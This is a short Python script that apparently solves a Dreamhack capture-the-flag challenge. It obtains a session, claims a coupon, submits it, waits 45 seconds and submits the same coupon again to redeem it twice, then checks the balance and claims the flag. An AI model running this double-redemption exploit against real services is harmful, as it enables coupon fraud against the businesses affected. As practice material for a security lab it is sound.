import requests, json, time

url = "http://host3.dreamhack.games:12840"


def sessionAcquire():
    sessionRequest = requests.get(url + "/session")
    session = json.loads(sessionRequest.text)["session"]

    headers = {"Authorization": session}
    requests.get(url + "/me", headers=headers)

    return session
    
    
def couponSubmit(session, sleepTime):
    headers = {"Authorization": session}
    couponClaimRequest = requests.get(url + "/coupon/claim", headers=headers)
    headers["coupon"] = json.loads(couponClaimRequest.text)["coupon"]

    print(requests.get(url + "/coupon/submit", headers=headers).text)

    time.sleep(sleepTime)
    print(requests.get(url + "/coupon/submit", headers=headers).text)

    meRequest = requests.get(url + "/me", headers=headers)
    print(json.loads(meRequest.text)["money"])

    headers = {"Authorization": session}
    print(requests.get(url + "/flag/claim", headers=headers).text)
    
    
if __name__ == "__main__":
    session = sessionAcquire()
    couponSubmit(session, 45)